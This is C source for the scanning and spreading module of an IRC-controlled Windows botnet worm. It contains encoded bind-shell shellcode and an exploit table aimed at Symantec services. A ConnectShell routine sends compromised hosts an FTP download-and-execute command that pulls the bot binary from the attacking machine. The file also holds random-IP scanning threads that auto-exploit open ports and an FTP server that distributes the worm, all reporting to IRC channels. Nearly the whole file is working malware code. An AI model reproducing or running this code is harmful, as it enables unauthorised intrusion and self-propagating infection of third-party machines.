#include "includes.h"
//#include "functions.h"
#include "extern.h"

char bindshell[] =
"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";
int bindshellsize=sizeof(bindshell);
/*---------------------------------------------------------/
.cscan [exploit] [threads] [delay] [time] [ip(-b/-a/-r) [-e(externalip)]
 -example-
 .cscan ms03026135 100 5 0 -b -r -e
/---------------------------------------------------------*/
#ifndef NO_ADVSCAN
// globals
ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection; //moodded advscan..
EXPLOIT exploit[]={
	{"SYMExploit", "SYMExploit", 8555, SYMExploit, 0, TRUE},
    {"SYMExploit", "SYMExploit", 2976, SYMExploit, 0, TRUE},
	{NULL, NULL, 0, NULL, 0, FALSE}
};
BOOL ConnectShell(EXINFO exinfo, unsigned int connectport)
{
	int len;
	char recvbuf[1024];
	char sendbuf[IRCLINE];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(exinfo.ip);
	shell_addr.sin_port = htons(connectport);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (connect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;

	char mkdir_buff[400];

	len = recv(sockfd, recvbuf, 1024, 0);

//	char fname[_MAX_FNAME];
//	sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	_snprintf(mkdir_buff,sizeof(mkdir_buff),
		"echo open %s %d > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -n -s:i &%s\r\n",
		GetIP(exinfo.sock),FTP_PORT,filename,filename);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);

	sprintf(sendbuf,"\2.executed.\2 %s [%s].",exinfo.ip,filename);
	if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = recv(sockfd, recvbuf, 1024, 0);
	closesocket(sockfd);
	return TRUE;
}
void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	 if(scan.exploit != -1) 
	 { 	
		if (exploit[scan.exploit].ftp)
		{
			if (findthreadid(FTP_THREAD) == 0) 
			{
				static FTP ftp;
				srand(time(NULL));
				ftp.port = rand()%64535+1000;
				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.sock=scan.sock;
				ftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(ftp.chan, scan.chan, sizeof(ftp.chan)-1);
					ftp.silent = TRUE;
				}
				else 
				{
					strncpy(ftp.chan, scan.msgchan, sizeof(ftp.chan)-1);
					ftp.silent = FALSE;
				}
				
				sprintf(sendbuf, "\2.ftp.\2: server started, port: %d, File: %s", ftp.port, ftp.filename);
				ftp.threadnum = addthread(sendbuf,FTP_THREAD,NULL);
				if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id))
				{
					while (ftp.gotinfo == FALSE) 
						Sleep(50);
				} 
				else
					sprintf(sendbuf, "\2.ftp.\2: failed to start server, error: <%d>.", GetLastError());

			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = ntohl(host);
	host += 1;
	host = htonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned short port, unsigned int delay)
{
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = htons(port);
	ioctlsocket(sock,FIONBIO,&blockcmd);
	connect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = select(0,0,&rset,0,&timeout);
	closesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->cgotinfo = TRUE;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) 
	{
		DWORD dwIP;
		
		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"\2.cscan.\2: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", 
			inet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) 
		{
			if (scan.exploit == -1) 
			{
				EnterCriticalSection(&CriticalSection); 

				sprintf(logbuf,"\2.cscan.\2: IP: %s, Port %d is open.",inet_ntoa(in),scan.port);
//                if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);

				LeaveCriticalSection(&CriticalSection);
			} 
			else 
			{
				EXINFO exinfo;

				sprintf(exinfo.ip, inet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);

			}
		}
		Sleep(500);
	}
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE]; 

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = inet_addr(scan.ip);

	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) 
	{
		DeleteCriticalSection(&CriticalSection);

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400))
		{
			sprintf(buffer,"\2.cscan.\2: Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);

			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) 
	{
		scan.cthreadid = i;
		sprintf(buffer,"\2.cscan.\2: %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} 
		else 
		{
			sprintf(buffer, "\2.cscan.\2: Failed to start worker thread, error: <%d>.", GetLastError());
		}
		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"\2.cscan.\2: Finished at %s:%d after %d minute(s) of scanning.", inet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}

#endif